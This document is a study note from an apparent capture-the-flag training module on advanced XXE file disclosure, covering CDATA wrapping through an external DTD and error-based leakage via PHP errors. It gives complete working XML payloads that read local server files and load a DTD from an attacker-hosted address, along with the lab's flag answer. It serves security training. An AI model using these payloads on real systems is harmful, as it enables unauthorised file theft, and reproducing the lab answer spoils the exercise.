## ID
531

## Module
Web Attacks

## Kind
notes

## Title
Section 15 — Advanced File Disclosure (XXE)

## Description
Exfiltrating files through XXE when basic methods fail, using CDATA wrapping with parameter entities hosted on an external DTD, and error-based XXE to leak file contents through PHP error messages.

## Tags
xxe, cdata, parameter-entities, error-based, dtd, file-disclosure

## Commands
- `echo '<!ENTITY joined "%begin;%file;%end;">' > XXE.dtd`
- `python3 -m http.server 8000`
- `<!ENTITY % begin "<![CDATA[">`
- `<!ENTITY % file SYSTEM "file:///<TARGET_FILE>">`
- `<!ENTITY % end "]]>">`
- `<!ENTITY % xxe SYSTEM "http://<ATTACKER_IP>:<PORT>/XXE.dtd">`
- `<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">`

## What This Section Covers
When target files contain XML special characters (`<`, `>`, `&`), basic XXE file reads break because the content isn't valid XML. This section introduces two advanced techniques: CDATA wrapping (using parameter entities joined via an external DTD to wrap file content in `<![CDATA[ ]]>` tags) and error-based XXE (forcing the server to leak file content inside PHP error messages when no XML output is reflected).

## Methodology

### CDATA Method (reflected output at `/index.php`)
1. Create an external DTD file that joins the begin, file, and end parameter entities: `echo '<!ENTITY joined "%begin;%file;%end;">' > XXE.dtd`
2. Host the DTD on your attack machine: `python3 -m http.server 8000`
3. Intercept the XML POST request in Burp Suite.
4. Inject a DOCTYPE defining `%begin` as `<![CDATA[`, `%file` as the target file via `file:///`, `%end` as `]]>`, and `%xxe` pointing to your hosted DTD.
5. Call `%xxe;` inside the DOCTYPE to load the external DTD, which joins the three entities into `&joined;`.
6. Place `&joined;` in the reflected XML element (e.g. `<email>&joined;</email>`).
7. Intercept the response — the raw file content appears wrapped in CDATA, bypassing XML parsing issues.

### Error-Based Method (no reflected output at `/error`)
1. Create a DTD file defining `%file` as the target file and `%error` as an entity referencing a non-existing entity joined with `%file;`.
2. Host the DTD on your attack machine.
3. Intercept the XML POST request and inject a DOCTYPE that loads your remote DTD via `%remote;`, then calls `%error;`.
4. The server throws an error containing the non-existing entity path — which includes the file content as part of the invalid URI.

## Multi-step Workflow (optional)
```
# === CDATA Method ===

# 1. Create external DTD
echo '<!ENTITY joined "%begin;%file;%end;">' > XXE.dtd

# 2. Host it
python3 -m http.server 8000

# 3. XML payload (inject into Burp Repeater)
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///flag.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8000/XXE.dtd">
  %xxe;
]>
<root>
<name>test</name>
<tel>1234</tel>
<email>&joined;</email>
<message>test</message>
</root>

# === Error-Based Method ===

# 1. Create error-triggering DTD
cat > XXE.dtd << EOF
<!ENTITY % file SYSTEM "file:///flag.php">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
EOF

# 2. Host it (same server)

# 3. XML payload
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://ATTACKER_IP:8000/XXE.dtd">
  %remote;
  %error;
]>
<root>
<name>test</name>
<tel>1234</tel>
<email>&content;</email>
<message>test</message>
</root>
```

## Lab — Questions & Answers (optional)
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Read /flag.php | HTB{3rr0r5_c4n_l34k_d474} | CDATA method with external DTD joining parameter entities, or error-based method leaking content in PHP error |

## Key Takeaways
- XML prevents joining internal and external entities directly — the workaround is to define all entities as parameter entities (`%`) and join them in an external DTD hosted on your server.
- CDATA wrapping (`<![CDATA[ ... ]]>`) tells the XML parser to treat content as raw data, bypassing special character restrictions.
- Error-based XXE works even when no XML element is reflected — you force the server to include file content in an error message by referencing a non-existing entity alongside the file entity.
- Both methods require hosting an external DTD, meaning outbound HTTP from the target to your machine must be allowed.
- Error-based XXE may have length limitations and can break on certain special characters — CDATA is more reliable when output is reflected.

## Gotchas (optional)
- Modern web servers may block reads of files like `index.php` to prevent entity self-reference DOS loops — if a file won't load, try a different target file first to confirm the technique works.
- Make sure the HTTP server hosting your DTD is running before sending the payload — the target fetches the DTD at parse time.
- In the error-based method, the file content appears inside the error URI string — look carefully in the full error output, not just the error message summary.
